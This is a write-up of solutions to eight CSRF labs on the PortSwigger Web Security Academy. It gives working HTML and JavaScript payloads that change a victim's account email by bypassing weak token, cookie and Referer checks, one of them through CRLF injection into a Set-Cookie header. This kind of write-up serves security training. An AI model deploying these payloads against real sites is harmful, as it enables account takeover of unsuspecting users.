1. This lab has no mitigations in place to prevent CSRF. As such, storing the following payload on the provided exploit server and pressing the `Deliver exploit to victim` button will solve the lab
```
<form id="csrf" action="https://ac6c1f1a1f59028bc09024ed00a80095.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="attacker@asdf.asdf">
</form>
<script>
document.getElementById('csrf').submit();
</script>
```
2. This lab implements CSRF tokens, but only checks them from POST requests. Because the server is tolerant of GET requests as well, the following exploit also works: `<img src="https://acae1ff71e4f0712c03d14fa0021005f.web-security-academy.net/my-account/change-email?email=adsf@asdf.as">`
3. This lab only checks CSRF tokens if one is present. As such, simply not providing one bypasses the check. This results in the following payload:
```
<form action="https://aca81f141e1bc743c01e22db00b800ca.web-security-academy.net/my-account/change-email" method="POST">
	<input type="hidden" name="email" value="asf@asdf.adsf">
</form>
<script>
document.forms[0].submit();
</script>
```
4. This lab properly checks CSRF tokens, but doesn't require that the token matches the one issued to a particular user's session. As such, using a valid CSRF token from a different account in the exploit causes the exploit to still work. This results in the following payload:
```
<form action="https://ac291ffa1eb207f5c06d174b00c60024.web-security-academy.net/my-account/change-email" method="POST">
	<input type="hidden" name="email" value="asdf@asdf.asdf">
	<input required type="hidden" name="csrf" value="Y7gXbZDV5x2xyYqTsVMwSrVsQE7sH4g8">
</form>
<script>
document.forms[0].submit();
</script>
```
5. This lab correctly validates CSRF tokens, but ties them to a different `csrfKey` cookie instead of the session cookie. Additionally, the search feature reflects the searched term into a `Set-Cookie` header, allowing GET requests to modify arbitrary cookies. As a result, the following payload can be used to override the victim's `csrfKey` cookie and make a request using a valid CSRF token for the chosen key:
```
<form action="https://ac8d1f171fee3f37c1f971f200db00c8.web-security-academy.net/my-account/change-email" method="POST">
	<input type="hidden" name="email" value="asdf@asdf.asdf">
	<input required type=hidden name=csrf value=ZKaAzKO3GbyvRFpnGktelLuCGcZ9Ecm8>
</form>
<img src="https://ac8d1f171fee3f37c1f971f200db00c8.web-security-academy.net/?search=a%0d%0aSet-Cookie:%20csrfKey=CuUHvVA2Va189yJVjQllymQ5ZA1CEgPC" onerror="document.forms[0].submit()">
```
6. This lab has the same vulnerability as above, but simply puts the CSRF token into a cookie instead of using a token to associate on the server side. As such, an almost identical payload that simply sets that cookie and uses the same value works:
```
<form action="https://aca21f6b1f12fc65c0a064a000e800de.web-security-academy.net/my-account/change-email" method="POST">
	<input type="hidden" name="email" value="asddf@asdf.asdf">
	<input required type="hidden" name="csrf" value="csrf">
</form>
<img src="https://aca21f6b1f12fc65c0a064a000e800de.web-security-academy.net/?search=a%0d%0aSet-Cookie:%20csrf=csrf" onerror="document.forms[0].submit()">
```
7. This lab doesn't use CSRF tokens, and instead checks that the `Referrer` is from the same domain. However, it defaults to allowing the request to work in the case that the header is absent. As such, the following payload works by not sending a `Referrer`:
```
<meta name="referrer" content="no-referrer">
<form action="https://ac221f031ec97ca3c01951340050003c.web-security-academy.net/my-account/change-email" method="POST">
	<input required type="email" name="email" value="asf@asdf.asdf">
</form>
<script>
document.forms[0].submit();
</script>
```
8. This lab has the same vulnerability as above, but actually ensures that a referrer is provided. To exploit this, you first must set the controlled server to send the header `Referrer-Policy: unsafe-url`. This will allow the `Referer` header to contain query strings as well, which is useful because the validation on the server side only checks that the correct domain is in the `Referer` at all. As such, the following payload will append the valid domain to the actual `Referer` header in a query string and perform the CSRF:
```
<form action="https://ace81fc21e2583e5c00954420063005a.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asdf@asdf.asdf">
</form>
<script>
history.pushState("", "", "/?ace81fc21e2583e5c00954420063005a.web-security-academy.net");
document.forms[0].submit();
</script>
```
